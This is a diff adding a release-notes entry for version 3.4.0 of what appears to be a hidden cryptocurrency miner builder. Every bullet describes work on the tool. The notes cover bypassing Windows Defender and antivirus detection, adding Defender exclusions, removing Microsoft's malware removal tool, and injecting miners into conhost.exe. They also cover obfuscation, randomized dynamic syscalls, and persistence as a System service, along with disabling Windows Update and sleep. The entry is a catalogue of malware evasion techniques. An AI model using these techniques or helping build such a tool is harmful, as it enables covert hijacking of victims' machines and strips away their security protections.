@@ -1,3 +1,39 @@
+### 3.4.0 (14-11-2023)
+* Changed administrator "Startup" installation procedure from using the Task Scheduler to instead install as a Service
+* Changed the Administrator "Startup" installation from installing into "Program Files" to instead install into "ProgramData"
+* Removed the "Run as System" option due to Services always running as System
+* Added MSRT removal to the "Add Defender Exclusions" feature
+* Changed the C++ compiler to one with less detections and better features
+* Improved external compiler starting procedure to bypass compiler bugs when the build path contains spaces or unicode characters
+* Modified the compilation process to incorporate "strip" for the removal of all unnecessary symbols and relocation data
+* Adjusted compiler optimization level to mitigate some antivirus detections
+* Enabled LTO during compilation to remove a lot of compiler caused detections from unused sections
+* Changed the compiler from using temporary files to instead use pipes in order to work better with some irregular environments
+* Changed the compilation procedure to add a randomized creation date and last write date to the built miner files
+* Reverted miner builder .NET Framework version back to .NET 4.5 from .NET 4.8 for better compatibility
+* Changed the miner injection technique to both reduce complexity and antivirus detections
+* Optimized the process creation code
+* Remade miner injection loop code and watchdog mutex check loop code to bypass a new targeted Windows Defender detection
+* Greatly improved the SysWhispersU syscall generator
+* Switched over from static syscalls to randomized dynamic syscalls
+* Changed the "Run as Administrator" feature to elevate programmatically instead of through a manifest file to avoid manifest caused detections
+* Added obfuscation to all constants and literals
+* Added base64 encoding to embedded files in order to bypass detections caused by high entropy data
+* Changed the embedded resource format from hex to decimal in order to reduce memory usage and time during compilation
+* Changed the default "Startup" tabs "Entry Name" and "File Name" to a randomized string due to Windows Defender targeting the current default names
+* Added new "Randomize" button next to the "Startup" tabs "Entry Name" and "File Name" options to allow for fast randomization
+* Added new "Advanced Option" that allows automatic UPX packing of the embedded miner resource files
+* Changed the "Disable Windows Update" and "Disable Sleep" functions to directly call the programs instead of calling them through a command line
+* Changed default "Inject Into" program to conhost.exe instead of explorer.exe due to explorer.exe now triggering detections when running under System
+* Added ".exe" extension exclusion to "Add Defender Exclusions" feature in order to potentially prevent some future general memory detections
+* Removed XMR "GPU Mining" option due to problems with CUDA and it being worse than the already existing dedicated GPU miner
+* Removed XMR "CPU Mining" option due to it having no reason to exist now that the "GPU Mining" option is gone
+* Rewrote XOR cipher function to bypass XOR obfuscation detection
+* Remade the "Block Websites" feature code to bypass some detections caused by looping
+* Greatly improved the overall code to reduce wasteful calls, handles and possible code signatures
+* Changed "Start Delay" to only apply before installation in order to avoid timeouts
+* Updated the uninstaller to properly remove all files
+* Updated the miners
 ### 3.3.1 (04/09/2023)
 * Added OpenCL ICD loader statically into the GPU miner because some systems local loaders do not seem to work
 * Added automatic CPU mining core restart when a prolonged period of zero hashrate is detected
